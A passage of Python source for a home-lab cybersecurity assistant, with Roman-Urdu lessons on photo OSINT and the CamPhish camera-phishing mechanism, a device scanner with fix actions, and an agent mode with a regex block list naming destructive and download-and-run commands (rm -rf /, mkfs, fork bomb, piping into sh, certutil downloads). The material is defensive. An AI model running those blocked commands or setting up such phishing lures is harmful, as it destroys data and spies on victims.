4) Bio mein sheher, school, mobile number jaise tukray mat joro - OSINT inhi tukron ko jod kar banta hai.
Yaad rakho: ye skill seekhne aur apni hifazat ke liye hai - kisi ko pareshan ya stalk karna jurm hai."""},

{"title": "Photo OSINT - ek photo tumhara kitna bata sakti hai",
 "body": """Ek photo sirf photo nahi hoti - us ke peeche ek poora safar hota hai:
- Reverse image search (TinEye, Google Lens) se pata chalta hai ye photo kahan kahan istemal hui aur sab se pehle kahan ayi.
- Photo ke andar chhupi EXIF info (khaas kar GPS location) aksar saath jati hai - jo photo tum bhejte ho, wo jagah bhi bata sakti hai.
- Kuch sites (masalan PimEyes) chehray se milti photos dhundti hain - ye PAID hain aur sirf wahi photos milti hain jo pehle se public hain.
Apni hifazat:
1) Apni ahem photos ko khud reverse-search karke dekho - kahan kahan phaili hain.
2) Photo bhejne se pehle location data off rakho (camera settings / share karte waqt 'location hatana').
3) Chehra-search wali sites par har shakhs apni photo ke liye 'opt-out / removal' ki darkhwast de sakta hai - ye haq tumhara apni photo ke liye hai.
4) Doosron ke chehray search karna un ki privacy ka mamla hai - seekho apni hifazat ke liye, istemal apni hi photo par karo.
Yaad rakho: internet par gayi photo wapis nahi aati - pehle socho, phir post karo."""},

{"title": "CamPhish - camera phishing ka mechanism aur bachao",
 "body": """CamPhish ek camera-phishing tool hai (Kali par chalta hai). Is ka mechanism samajhna hi is se bachao hai:
1) Nakli page: ek bana-banaya dhokay wala page (birthday wish, online meeting waghera) jo asal lagta hai.
2) Tunnel: wo page Cloudflare/Ngrok tunnel se ek ajeeb se link ban jata hai jo kisi ko bhi bheja ja sakta hai.
3) Link khula to: kholne wale ka IP address aur device/browser ki info foran record ho jati hai - is ke liye koi permission nahi lagti.
4) Asal darwaza: page browser se CAMERA ki permission mangta hai. 'Allow' ho jaye to page ka JavaScript code (getUserMedia) camera se photos kheench kar tool tak bhej deta hai. Permission NA mile to camera se ek photo bhi nahi ja sakti.
Pehchan ki nishaniyan:
- Anjaan/chhota ya ajeeb link (trycloudflare, ngrok jaisi domains) + achanak camera/location ki mang.
- Page ka kaam kuch aur, permission kuch aur maang raha ho.
Bachao:
- Browser Settings > Privacy and security > Site settings > Camera (aur Location) mein jao - jin sites ko ijazat di hui hai wo list dekho, jo na pehchano use Remove/Block kar do.
- Permission hamesha tab do jab site pakki aur wajah saaf ho - warna Block.
- Dost se aya ajeeb link bhi check karo - account hack hua ho sakta hai.
Yaad rakho (viva line): 'Permission hi taala hai - CamPhish ki taqat tool mein nahi, us Allow button mein hai jo banda baghair soche daba deta hai.'
Aur lakeer: ye mechanism seekhna training hai; kisi par baghair us ki marzi ke chalana PECA ke tehet jurm hai."""},
]


# ---------------------------------------------------------------------------
# AGENT MODE - "Kaho, aur wo kar de"
# Assistant pehle PLAN banata hai, tum command parh kar RUN dabate ho.
# Khatarnak commands server khud rok deta hai (BLOCKED list) - ye hifazat
# browser se band nahi ho sakti.
# ---------------------------------------------------------------------------
AGENT_LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent_log.md")

AGENT_PLAN_PROMPT = """You are the planning brain of a cybersecurity LAB assistant that runs on the user's OWN machine, in his OWN home lab (his own VMs, CTF boxes, his own network). The user describes a task in words. Reply with ONLY a JSON object and no other text, in exactly this shape:
{"steps": [{"command": "...", "why": "one short line"}], "notes": "..."}
Rules:
- At most 5 steps, one command per step.
- Commands must match the given OS.
- Only standard, safe lab commands. NEVER propose destructive commands (no deleting system files, no formatting disks, no shutdown/reboot, no changing other people's systems).
- If a target IP/host is needed but not given, use the placeholder TARGET_IP in the command and say in notes what to replace it with.
- Prefer the simplest command that does the job, with the most important flags only."""

BLOCKED = [
    (r"rm\s+-[a-z]*r[a-z]*f[a-z]*\s+/(\s|$)", "Poora system mitane wali command hai"),
    (r"rm\s+-[a-z]*r[a-z]*f[a-z]*\s+~", "Poora home folder mitane wali command hai"),
    (r"rm\s+-[a-z]*r[a-z]*f[a-z]*\s+\*", "Sab kuch mitane wali command hai"),
    (r"\bmkfs\b", "Disk format karne wali command hai"),
    (r"\bdd\b[^|]*\bof=/dev/", "Seedha disk par likhna - data khatam ho jayega"),
    (r">\s*/dev/(sd|hd|nvme)", "Seedha disk par likhna - data khatam ho jayega"),
    (r"\bformat\s+[a-z]:", "Drive format karne wali command hai"),
    (r"\b(diskpart|wipefs)\b", "Disk ke partitions se ched-chad hai"),
    (r"rd\s+/s\s+/q\s+[a-z]:\\", "Poori drive mitane wali command hai"),
    (r":\(\)\s*\{", "Fork bomb hai - machine hang ho jayegi"),
    (r"\b(shutdown|poweroff|halt)\b", "Machine band karne wali command is mode mein nahi chalegi"),
    (r"\breboot\b", "Machine restart karne wali command is mode mein nahi chalegi"),
    (r"\bchmod\s+-R\s+777\s+/", "Poore system ki permissions kholna khatarnak hai"),
    (r"\|\s*(sudo\s+)?(sh|bash|zsh)\b", "Internet se download karke seedha chalana - Agent Mode mein mana hai"),
    (r"invoke-expression", "Download karke chalane wali command - Agent Mode mein mana hai"),
    (r"certutil\s+.*(-urlcache|-f\s+http)", "Certutil se download - Agent Mode mein mana hai"),
]


def check_blocked(cmd):
    for pat, why in BLOCKED:
        if re.search(pat, cmd, re.IGNORECASE):
            return why
    return None


def log_agent(cmd, code):
    try:
        stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(AGENT_LOG, "a", encoding="utf-8") as f:
            f.write(f"- `{stamp}` — `{cmd}` — exit code: {code}\n")
    except Exception:
        pass


def run_command(cmd):
    cmd = (cmd or "").strip()
    if not cmd:
        return {"error": "Khali command hai."}
    why = check_blocked(cmd)
    if why:
        return {"blocked": True, "reason": why, "command": cmd}
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           timeout=180, errors="replace")
        log_agent(cmd, p.returncode)
        return {"command": cmd, "code": p.returncode,
                "stdout": (p.stdout or "")[-6000:], "stderr": (p.stderr or "")[-3000:]}
    except subprocess.TimeoutExpired:
        log_agent(cmd, "timeout")
        return {"command": cmd, "error": "Command 180 seconds mein khatam nahi hui, rok di gayi. Bari scans (nmap -p- waghera) zyada waqt leti hain - command ko chhota hisson mein tod kar chalao."}
    except Exception as e:
        return {"command": cmd, "error": str(e)}


def ollama_raw(messages):
    payload = {"model": MODEL, "messages": messages, "stream": False}
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(OLLAMA_URL, data=data,
                                 headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=300) as resp:
        result = json.loads(resp.read().decode("utf-8"))
    return result["message"]["content"].strip()


OFFLINE_MSG = ("AI abhi OFFLINE hai - Ollama nahi chal raha.\n"
               "Setup: 1) ollama.com se Ollama install karo  2) Terminal: ollama pull llama3.2:3b  "
               "3) Page refresh karo. (Manual Run phir bhi chalega - command tum likho, assistant chala dega.)")


def _agent_plan(self, data):
    task = str(data.get("task", "")).strip()
    if not task:
        self._send_json({"error": "Pehle task likho."}, 400)
        return
    if not ollama_alive():
        self._send_json({"error": OFFLINE_MSG})
        return
    try:
        raw = ollama_raw([
            {"role": "system", "content": AGENT_PLAN_PROMPT},
            {"role": "user", "content": f"OS: {platform.system()}\nTask: {task}"},
        ])
    except Exception as e:
        self._send_json({"error": f"Model se plan nahi aya ({e})."})
        return
    steps, notes = [], ""
    try:
        start, end = raw.find("{"), raw.rfind("}")
        obj = json.loads(raw[start:end + 1])
        for s in obj.get("steps", [])[:5]:
            c = str(s.get("command", "")).strip()
            if c:
                steps.append({"command": c, "why": str(s.get("why", "")).strip()})
        notes = str(obj.get("notes", "")).strip()
    except Exception:
        pass
    if steps:
        self._send_json({"steps": steps, "notes": notes})
    else:
        self._send_json({"steps": [], "raw": raw,
                         "notes": "Model ne saaf plan nahi diya. Us ka jawab neeche hai - commands Manual Run mein haath se chala sakte ho."})


def _agent_run(self, data):
    self._send_json(run_command(str(data.get("command", ""))))


def _agent_explain(self, data):
    if not ollama_alive():
        self._send_json({"error": OFFLINE_MSG})
        return
    task = str(data.get("task", ""))[:500]
    cmd = str(data.get("command", ""))[:500]
    out = str(data.get("output", ""))[:3000]
    try:
        reply = ollama_raw([
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": f"Task: {task}\nMaine ye command chalayi: {cmd}\nOutput:\n{out}\n\nIs output ko simple words mein samjhao: kya mila, sab se ahem cheez kya hai, aur agla step kya hona chahiye."},
        ])
        self._send_json({"reply": reply})
    except Exception as e:
        self._send_json({"error": f"Samjhaya nahi ja saka ({e})."})


Handler._agent_plan = _agent_plan
Handler._agent_run = _agent_run
Handler._agent_explain = _agent_explain


# ---------------------------------------------------------------------------
# DEVICE SCAN - "Meri device check karo"
# Ek click: Defender, firewall, startup, ajeeb processes, connections,
# hosts file, nayi executable files. Sirf DEKHTA hai - kuch delete nahi karta.
# ---------------------------------------------------------------------------
import shutil

SCAN_EXTS = {".exe", ".bat", ".cmd", ".ps1", ".vbs", ".js", ".scr", ".msi", ".com"}
BRAND_WORDS = ("google", "microsoft", "windowsupdate", "avast", "avg", "kaspersky",
               "mcafee", "norton", "facebook", "youtube", "bank", "update")


def _run(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           timeout=timeout, errors="replace")
        return (p.stdout or "") + (p.stderr or "")
    except Exception:
        return ""


def _f(level, title, detail=""):
    return {"level": level, "title": title, "detail": detail}


def _check_hosts(path):
    """Hosts file ki extra entries - classic hijack ki nishani."""
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            lines = fh.read().splitlines()
    except Exception:
        return None
    bad = []
    for ln in lines:
        ln = ln.strip()
        if not ln or ln.startswith("#"):
            continue
        parts = ln.split()
        if len(parts) >= 2 and parts[1].lower() not in ("localhost", "ip6-localhost", "ip6-loopback"):
            bad.append(ln)
    return bad


def _hosts_finding(path, label):
    bad = _check_hosts(path)
    if bad is None:
        return _f("warn", f"{label} parhi nahi ja saki", "File mili nahi ya permission nahi.")
    if not bad:
        return _f("ok", f"{label} saaf hai", "Koi extra entry nahi - koi site zabardasti redirect nahi ho rahi.")
    joined = " ; ".join(bad[:8])
    act = [{"label": "Hosts saaf karo (extra lines hatao)", "action": "clean_hosts",
            "params": {"path": path},
            "confirm": "Hosts file se ye extra lines hat jayengi (pehle backup banega). Pakka saaf karun?"}]
    if any(b in " ".join(bad).lower() for b in BRAND_WORDS):
        f = _f("danger", f"{label} mein shakki entries hain!", f"Ye lines mashhoor sites ko kahin aur bhej sakti hain: {joined}")
        f["actions"] = act
        return f
    f = _f("warn", f"{label} mein {len(bad)} extra entries hain", f"Dekho ye tum ne khud dali thin ya nahi: {joined}")
    f["actions"] = act
    return f


def _is_private(ip):
    return ip.startswith(("10.", "127.", "192.168.", "0.")) or \
        re.match(r"172\.(1[6-9]|2\d|3[0-1])\.", ip) is not None


def _recent_exes(folders, days=14):
    found, cutoff = [], datetime.datetime.now().timestamp() - days * 86400
    for folder in folders:
        try:
            for name in os.listdir(folder):
                full = os.path.join(folder, name)
                if os.path.isfile(full) and os.path.splitext(name)[1].lower() in SCAN_EXTS:
                    if os.path.getmtime(full) > cutoff:
                        found.append((name, full))
        except Exception:
            pass
    return found[:12]


def scan_windows():
    F = []
    # 1) Windows Defender
    out = _run('powershell -NoProfile -Command "Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated | Format-List"', 60)
    m_av = re.search(r"AntivirusEnabled\s*:\s*(\w+)", out)
    m_rt = re.search(r"RealTimeProtectionEnabled\s*:\s*(\w+)", out)
    m_sg = re.search(r"AntivirusSignatureLastUpdated\s*:\s*(.+)", out)
    if m_av:
        sig = f" Signatures last update: {m_sg.group(1).strip()}." if m_sg else ""
        if m_av.group(1) == "True" and m_rt and m_rt.group(1) == "True":
            F.append(_f("ok", "Windows Defender ON hai", "Antivirus aur real-time protection dono chal rahe hain." + sig))
        else:
            f = _f("danger", "Defender / Real-time protection BAND hai!", "Ye sab se khatarnak halat hai - Windows Security khol kar foran ON karo." + sig)
            f["actions"] = [{"label": "Defender ON karo", "action": "defender_on", "params": {},
                             "confirm": "Defender ki real-time protection ON karun? (Admin permission lag sakti hai)"}]
            F.append(f)
    else:
        F.append(_f("warn", "Defender ki halat samajh nahi ayi", "PowerShell se jawab nahi mila. Ho sakta hai doosra antivirus laga ho - khud Windows Security khol kar dekh lo."))
    # 2) Purane threats
    thr = _run('powershell -NoProfile -Command "Get-MpThreatDetection | Select-Object -First 5 InitialDetectionTime | Format-List"', 60)
    if "InitialDetectionTime" in thr:
        dates = re.findall(r"InitialDetectionTime\s*:\s*(.+)", thr)
        f = _f("danger", "Defender ko pehle threats mile thay!", "Detection dates: " + ", ".join(d.strip() for d in dates[:5]) + ". Windows Security > Virus & threat protection > Protection history khol kar dekho, aur ek FULL SCAN chalao.")
        f["actions"] = [{"label": "Defender Quick Scan chalao", "action": "defender_quickscan", "params": {},
                         "confirm": "Defender Quick Scan shuru karun? Kuch minutes peeche chalega."}]
        F.append(f)
    # 3) Firewall
    fw = _run("netsh advfirewall show allprofiles state", 20)
    offs = len(re.findall(r"State\s+OFF", fw, re.IGNORECASE))
    if offs == 0 and "State" in fw:
        F.append(_f("ok", "Firewall ON hai", "Teeno profiles (Domain/Private/Public) mehfooz hain."))
    elif offs:
        f = _f("danger", f"Firewall {offs} profile par BAND hai!", "Windows Security > Firewall & network protection se foran ON karo.")
        f["actions"] = [{"label": "Firewall ON karo", "action": "firewall_on", "params": {},
                         "confirm": "Firewall teeno profiles par ON karun? (Admin permission lag sakti hai)"}]
        F.append(f)
    else:
        F.append(_f("warn", "Firewall check nahi ho saka", "netsh se jawab nahi aya."))
    # 4) Startup programs
    sus, total = [], 0
    for hive in ("HKCU", "HKLM"):
        o = _run(f'reg query "{hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"', 15)
        for ln in o.splitlines():
            if "REG_SZ" in ln:
                total += 1
                name = ln.split("REG_SZ", 1)[0].strip()
                path = ln.split("REG_SZ", 1)[1].strip()
                if "\\temp\\" in path.lower() or "\\appdata\\" in path.lower():
                    sus.append((hive, name, path))
    if sus:
        for hive, name, path in sus[:5]:
            f = _f("danger", f"Startup mein shakki program: {name}",
                   f"Ye program Windows ke saath khud chal padta hai, aur is ki file shakki jagah par hai: {path}")
            f["actions"] = [
                {"label": "Startup se hatao", "action": "remove_startup",
                 "params": {"hive": hive, "name": name},
                 "confirm": f"'{name}' ab Windows ke saath khud nahi chalega. Pakka hataun?"},
                {"label": "File bhi DELETE karo", "action": "delete_file",
                 "params": {"path": path},
                 "confirm": f"Pakka DELETE karun? Ye file hamesha ke liye chali jayegi:\n{path}"},
            ]
            F.append(f)
    else:
        F.append(_f("ok", f"Startup programs theek lage ({total} entries)", "Koi program Temp/AppData se auto-start nahi ho raha."))
    # 5) Ajeeb jagah se chalte processes
    ps = _run('powershell -NoProfile -Command "Get-Process | Where-Object {$_.Path} | ForEach-Object { $_.Id.ToString() + \'|\' + $_.Name + \'|\' + $_.Path }"', 45)
    bad_proc = []
    for ln in ps.splitlines():
        parts = ln.split("|", 2)
        if len(parts) == 3:
            pid, name, path = parts[0].strip(), parts[1].strip(), parts[2].strip()
            low = path.lower()
            if "\\temp\\" in low or "\\downloads\\" in low:
                bad_proc.append((pid, name, path))
    if bad_proc:
        for pid, name, path in bad_proc[:5]:
            f = _f("warn", f"Ajeeb jagah se chalta program: {name}",
                   f"Temp/Downloads se chalna aam programs ki aadat nahi. File: {path} (PID {pid})")
            acts = []
            if pid.isdigit():
                acts.append({"label": "Abhi band karo (kill)", "action": "kill_process",
                             "params": {"pid": pid},
                             "confirm": f"'{name}' (PID {pid}) ko band karun? Chalti hui file ya save na kiya kaam ja sakta hai."})
            acts.append({"label": "File DELETE karo (pehle band karna hoga)", "action": "delete_file",
                         "params": {"path": path},
                         "confirm": f"Pakka DELETE karun? Ye file hamesha ke liye chali jayegi:\n{path}"})
            f["actions"] = acts
            F.append(f)
    else:
        F.append(_f("ok", "Processes saaf lage", "Koi program Temp ya Downloads folder se nahi chal raha."))
    # 6) Bahar ki connections
    ns = _run("netstat -ano -p TCP", 20)
    tl = _run("tasklist /fo csv /nh", 20)
    pidname = {}
    for ln in tl.splitlines():
        parts = [p.strip('"') for p in ln.split('","')]
        if len(parts) >= 2 and parts[1].isdigit():
            pidname[parts[1]] = parts[0]
    ext = []
    for ln in ns.splitlines():
        parts = ln.split()
        if len(parts) >= 5 and parts[3].upper() == "ESTABLISHED":
            foreign = parts[2].rsplit(":", 1)[0].strip("[]")
            if not _is_private(foreign):
                ext.append(f"{pidname.get(parts[4], 'PID ' + parts[4])} -> {parts[2]}")
    if ext:
        F.append(_f("ok", f"Bahar (internet) se {len(ext)} live connections", "Ye aam bhi ho sakta hai (browser, WhatsApp waghera). Naam parho - jo program na pehchano, wo sawal hai: " + " ; ".join(ext[:10])))
    else:
        F.append(_f("ok", "Koi bahari live connection nahi mila", "Is waqt koi program internet se nahi juda."))
    # 7) Hosts file
    hosts = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "drivers", "etc", "hosts")
    F.append(_hosts_finding(hosts, "Hosts file"))
    # 8) Nayi executable files
    home = os.path.expanduser("~")
    exes = _recent_exes([os.path.join(home, "Downloads"), os.environ.get("TEMP", "")])
    if exes:
        for name, full in exes[:6]:
            f = _f("warn", f"Nayi executable file: {name}",
                   f"Pichle 14 din mein Downloads/Temp mein ayi hai: {full}. Ise pehchano - na pehchano to MAT chalao.")
            f["actions"] = [{"label": "DELETE karo", "action": "delete_file",
                             "params": {"path": full},
                             "confirm": f"Pakka DELETE karun? Ye file hamesha ke liye chali jayegi:\n{full}"}]
            F.append(f)
        if len(exes) > 6:
            F.append(_f("warn", f"Aur {len(exes) - 6} nayi executable files bhi hain",
                        "Baaki ke naam: " + ", ".join(n for n, _ in exes[6:])))
    else:
        F.append(_f("ok", "Koi nayi executable file nahi mili", "Downloads/Temp mein pichle 14 din ki koi .exe/.bat/.ps1 waghera nahi."))
    # 9) Disk space
    try:
        t, u, fr = shutil.disk_usage("C:\\")
        pct = fr * 100 // t
        if pct < 5:
            F.append(_f("warn", f"C: drive taqreeban full hai ({pct}% khali)", "Bohat kam jagah se machine slow aur updates fail hote hain."))
        else:
            F.append(_f("ok", f"C: drive mein {pct}% jagah khali hai", "Disk space theek hai."))
    except Exception:
        pass
    return F


def scan_linux():
    F = []
    ss = _run("ss -tuln 2>/dev/null | head -40", 15)
    n = max(0, len([l for l in ss.splitlines() if l.strip()]) - 1)
    F.append(_f("ok", f"Listening ports: {n}", "Ye ports is machine par sun rahe hain (ss -tuln). Jo service na pehchano, wo check karo."))
    ps = _run("ps aux", 15)
    bad = []
    for l in ps.splitlines():
        if " /tmp/" in l or "/dev/shm" in l:
            parts = l.split(None, 10)
            if len(parts) >= 11 and parts[1].isdigit():
                bad.append((parts[1], parts[10][:80]))
    if bad:
        for pid, cmd in bad[:5]:
            f = _f("danger", "/tmp se chalta hua program!", f"PID {pid}: {cmd} - Linux par ye malware ki aam nishani hai.")
            f["actions"] = [{"label": "Band karo (kill)", "action": "kill_process",
                             "params": {"pid": pid},
                             "confirm": f"PID {pid} ko band karun? Chalti hui file ya save na kiya kaam ja sakta hai."}]
            F.append(f)
    else:
        F.append(_f("ok", "Processes saaf lage", "Koi program /tmp ya /dev/shm se nahi chal raha."))
    F.append(_hosts_finding("/etc/hosts", "Hosts file"))
    cron = _run("crontab -l 2>/dev/null", 10)
    if "curl" in cron or "wget" in cron:
        f = _f("danger", "Crontab mein download wali entry hai!", "Khud-bakhud internet se kuch lana malware ki nishani ho sakti hai: " + cron.strip()[:200])
        f["actions"] = [{"label": "Download wali lines hatao", "action": "cron_clean", "params": {},
                         "confirm": "Crontab se sirf curl/wget wali lines hatengi. Pakka?"}]
        F.append(f)
    elif cron.strip():
        F.append(_f("ok", "Crontab entries mojood hain", "Download wali koi entry nahi mili."))
    else:
        F.append(_f("ok", "Crontab khali hai", "Koi scheduled task nahi."))
    try:
        t, u, fr = shutil.disk_usage("/")
        pct = fr * 100 // t
        if pct < 5:
            F.append(_f("warn", f"Disk taqreeban full hai ({pct}% khali)", "Jaga kam ho to system slow ho jata hai."))
        else:
            F.append(_f("ok", f"Disk mein {pct}% jagah khali hai", "Disk space theek hai."))
    except Exception:
        pass
    return F


def device_scan():
    osname = platform.system()
    findings = scan_windows() if osname == "Windows" else scan_linux()
    counts = {"ok": 0, "warn": 0, "danger": 0}
    for f in findings:
        counts[f["level"]] = counts.get(f["level"], 0) + 1
    lines = [f"DEVICE SCAN - {osname} - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}"]
    for f in findings:
        lines.append(f"[{f['level'].upper()}] {f['title']} :: {f['detail']}")
    return {"os": osname, "findings": findings, "counts": counts, "text": "\n".join(lines)}


def _api_scan(self, data):
    self._send_json(device_scan())


def _api_scan_explain(self, data):
    if not ollama_alive():
        self._send_json({"error": OFFLINE_MSG})
        return
    report = str(data.get("report", ""))[:5000]
    if not report:
        self._send_json({"error": "Pehle scan chalao."}, 400)
        return
    try:
        reply = ollama_raw([
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": "Ye meri device scan ki report hai:\n\n" + report + "\n\nSimple words mein samjhao: meri device ki halat kaisi hai? Kin findings par dhyan dun? Koi khatarnak cheez hai to foran kya karun, qadam-ba-qadam. Agar sab theek hai to saaf taur par kaho ke sab theek hai."},
        ])
        self._send_json({"reply": reply})
    except Exception as e:
        self._send_json({"error": f"Samjhaya nahi ja saka ({e})."})


Handler._api_scan = _api_scan
Handler._api_scan_explain = _api_scan_explain


# ---------------------------------------------------------------------------
# FIX ACTIONS - delete/remove SIRF user ke kehne par.
# Server sirf ye pehle-se-tay actions chalata hai - browser se koi bhi
# apni marzi ki command nahi bheji ja sakti. Har fix agent_log.md mein
# likha jata hai.
# ---------------------------------------------------------------------------
def _fix_result(ok, message):
    return {"ok": ok, "message": message}


def _extract_exe_path(raw):
    raw = (raw or "").strip()
    if raw.startswith('"'):
        end = raw.find('"', 1)
        if end > 1:
            return raw[1:end]
    m = re.match(r"(.+?\.(?:exe|bat|cmd|ps1|vbs|scr|msi|com))", raw, re.IGNORECASE)
    if m:
        return m.group(1)
    return raw


def do_fix(action, params):
    params = params or {}
    try:
        if action == "kill_process":
            pid = str(params.get("pid", ""))
            if not pid.isdigit():
                return _fix_result(False, "PID theek nahi mila.")
            if platform.system() == "Windows":
                p = subprocess.run(["taskkill", "/PID", pid, "/F"], capture_output=True,
                                   text=True, timeout=30, errors="replace")
            else:
                p = subprocess.run(["kill", "-9", pid], capture_output=True,
                                   text=True, timeout=30, errors="replace")
            log_agent(f"FIX kill_process pid={pid}", p.returncode)
            if p.returncode == 0:
                return _fix_result(True, f"Program band kar diya (PID {pid}).")
            msg = ((p.stdout or "") + (p.stderr or "")).strip()
            return _fix_result(False, f"Band nahi ho saka: {msg[:200]}")

        if action == "remove_startup":
            hive = str(params.get("hive", ""))
            name = str(params.get("name", ""))
            if hive not in ("HKCU", "HKLM") or not name or '"' in name:
                return _fix_result(False, "Startup entry ki info theek nahi.")
            key = f"{hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            p = subprocess.run(["reg", "delete", key, "/v", name, "/f"], capture_output=True,
                               text=True, timeout=30, errors="replace")
            log_agent(f"FIX remove_startup {hive} {name}", p.returncode)
            if p.returncode == 0:
                return _fix_result(True, f"'{name}' startup se hat gaya - ab Windows ke saath khud nahi chalega.")
            return _fix_result(False, "Hata nahi saka - ho sakta hai admin permission chahiye. Assistant ko 'Run as administrator' se chalao.")

        if action == "delete_file":
            cand = _extract_exe_path(str(params.get("path", "")))
            if not cand:
                return _fix_result(False, "File ka rasta samajh nahi aya.")
            full = os.path.realpath(cand)
            home = os.path.realpath(os.path.expanduser("~"))
            allowed = [os.path.join(home, "Downloads"), os.path.join(home, "AppData"),
                       os.path.realpath(os.environ.get("TEMP", ""))]
            if not any(a and full.lower().startswith(os.path.realpath(a).lower()) for a in allowed):
                return _fix_result(False, "Hifazat ki wajah se ye file delete nahi hogi - sirf Downloads, Temp ya AppData ke andar ki file delete ho sakti hai.")
            if not os.path.isfile(full):
                return _fix_result(False, "File mili nahi (ho sakta hai pehle hi band/delete ho chuki ho).")
            os.remove(full)
            log_agent(f"FIX delete_file {full}", 0)
            return _fix_result(True, f"File delete ho gayi: {full}")

        if action == "clean_hosts":
            path = str(params.get("path", ""))
            bad = _check_hosts(path) or []
            if not bad:
                return _fix_result(True, "Hosts file pehle hi saaf hai.")
            with open(path, encoding="utf-8", errors="replace") as fh:
                lines = fh.read().splitlines()
            keep = []
            for ln in lines:
                s = ln.strip()
                parts = s.split()
                if s and not s.startswith("#") and len(parts) >= 2 and \
                        parts[1].lower() not in ("localhost", "ip6-localhost", "ip6-loopback"):
                    continue
                keep.append(ln)
            backup = path + ".bak-assistant"
            with open(backup, "w", encoding="utf-8") as fh:
                fh.write("\n".join(lines))
            with open(path, "w", encoding="utf-8") as fh:
                fh.write("\n".join(keep) + "\n")
            log_agent(f"FIX clean_hosts {path} removed={len(lines) - len(keep)}", 0)
            return _fix_result(True, f"Hosts saaf ho gaya - {len(lines) - len(keep)} extra lines hat gayeen. Backup yahan hai: {backup}")

        if action == "defender_on":
            p = subprocess.run(["powershell", "-NoProfile", "-Command",
                                "Set-MpPreference -DisableRealtimeMonitoring $false"],
                               capture_output=True, text=True, timeout=60, errors="replace")
            log_agent("FIX defender_on", p.returncode)
            if p.returncode == 0:
                return _fix_result(True, "Defender real-time protection ON kar di gayi. Dobara scan karke confirm kar lo.")
            return _fix_result(False, "ON nahi ho saka - aksar wajah Tamper Protection ya admin permission hoti hai. Windows Security > Virus & threat protection > Manage settings se haath se ON karo.")

        if action == "defender_quickscan":
            p = subprocess.run(["powershell", "-NoProfile", "-Command", "Start-MpScan -ScanType QuickScan"],
                               capture_output=True, text=True, timeout=60, errors="replace")
            log_agent("FIX defender_quickscan", p.returncode)
            if p.returncode == 0:
                return _fix_result(True, "Defender Quick Scan shuru ho gaya hai - peeche chalega, kuch minutes lag sakte hain.")
            return _fix_result(False, "Scan shuru nahi ho saka - Windows Security se haath se chalao.")

        if action == "firewall_on":
            p = subprocess.run(["netsh", "advfirewall", "set", "allprofiles", "state", "on"],
                               capture_output=True, text=True, timeout=30, errors="replace")
            out = ((p.stdout or "") + (p.stderr or "")).lower()
            log_agent("FIX firewall_on", p.returncode)
            if "ok" in out:
                return _fix_result(True, "Firewall teeno profiles par ON ho gaya.")
            return _fix_result(False, "ON nahi ho saka - admin permission chahiye. Assistant ko 'Run as administrator' se chalao.")

        if action == "cron_clean":
            cur = _run("crontab -l 2>/dev/null", 10)
            all_lines = cur.splitlines() if cur.strip() else []
            kept = [l for l in all_lines if "curl" not in l and "wget" not in l]
            removed = len(all_lines) - len(kept)
            if removed <= 0:
                return _fix_result(True, "Download wali koi entry nahi mili.")
            proc = subprocess.run("crontab -", shell=True, input="\n".join(kept) + "\n",
                                  capture_output=True, text=True, timeout=15, errors="replace")
            log_agent("FIX cron_clean", proc.returncode)
            if proc.returncode == 0:
                return _fix_result(True, f"Crontab se {removed} download wali lines hat gayeen.")
            return _fix_result(False, "Crontab saaf nahi ho saka.")

        return _fix_result(False, "Ye action pehchana nahi gaya.")
    except PermissionError:
        return _fix_result(False, "Permission nahi mili - assistant ko 'Run as administrator' (Windows) ya sudo (Kali) se chalao.")
    except Exception as e:
        return _fix_result(False, f"Masla aya: {e}")


def _api_fix(self, data):
    self._send_json(do_fix(str(data.get("action", "")), data.get("params", {})))


Handler._api_fix = _api_fix


# ---------------------------------------------------------------------------
# APNA NETWORK TEST - sirf apne network ki hifazati jaanch.
# WiFi encryption, apne WiFi password ki taqat (password kabhi dikhaya
# nahi jata), router ke ports, network ki devices, camera-type ports.
# ---------------------------------------------------------------------------
import socket
from concurrent.futures import ThreadPoolExecutor

COMMON_BAD_PASSWORDS = {"password", "12345678", "123456789", "1234567890", "qwerty123",
                        "admin123", "pakistan", "pakistan1", "iloveyou", "letmein",
                        "wifi1234", "internet", "football", "welcome1"}


def _port_open(ip, port, timeout=0.5):
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except Exception:
        return False


def _password_weaknesses(pw):
    reasons = []
    if len(pw) < 8:
        reasons.append("8 characters se chhota hai")
    if pw.isdigit():
        reasons.append("sirf numbers hain - sab se pehle yahi try hote hain")
    if re.fullmatch(r"03\d{9}", pw):
        reasons.append("mobile number jaisa hai - Pakistan mein sab se aam WiFi password yahi hota hai")
    if pw.lower() in COMMON_BAD_PASSWORDS:
        reasons.append("duniya ke aam passwords ki list mein hai")
    if pw.isalpha() and pw.islower():
        reasons.append("sirf chhoti abc hai - number ya nishan (symbol) koi nahi")
    if re.fullmatch(r"[a-z]+\d{1,4}", pw.lower()):
        reasons.append("naam + chhota number wala style hai - wordlist mein foran mil jata hai")
    return reasons


def network_test():
    osname = platform.system()
    F = []
    gateway, myip, dns = None, None, []
    if osname == "Windows":
        ipc = _run("ipconfig /all", 20)
        m = re.search(r"IPv4 Address[^:]*:\s*([\d.]+)", ipc)
        myip = m.group(1) if m else None
        m = re.search(r"Default Gateway[^:]*:\s*([\d.]+)", ipc)
        gateway = m.group(1) if m else None
        dns = re.findall(r"DNS Servers[^:]*:\s*([\d.]+)", ipc)
        wl = _run("netsh wlan show interfaces", 20)
        ssid, auth = None, None
        m = re.search(r"^\s*SSID\s*:\s*(.+)$", wl, re.M)
        if m:
            ssid = m.group(1).strip()
        m = re.search(r"Authentication\s*:\s*(.+)", wl)
        if m:
            auth = m.group(1).strip()
        if ssid:
            a = (auth or "").upper()
            if "WPA3" in a:
